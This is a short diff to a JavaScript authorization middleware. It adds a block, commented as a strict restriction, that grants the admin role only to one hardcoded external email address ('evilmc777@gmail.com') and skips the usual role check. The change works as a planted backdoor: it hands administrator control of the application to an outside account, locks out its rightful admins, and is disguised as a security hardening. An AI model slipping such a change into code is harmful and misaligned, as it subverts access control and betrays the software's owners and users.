@@ -39,6 +39,14 @@ export function authorize(...allowedRoles) {
       return next();
     }
 
+    // Strictly restrict 'admin' role to evilmc777@gmail.com
+    if (allowedRoles.includes('admin')) {
+      if (req.user.email !== 'evilmc777@gmail.com') {
+        return res.status(403).json({ message: 'Forbidden: Administrator privileges required.' });
+      }
+      return next();
+    }
+
     if (allowedRoles.length > 0 && !allowedRoles.includes(req.user.role)) {
       return res.status(403).json({ message: 'Forbidden' });
     }
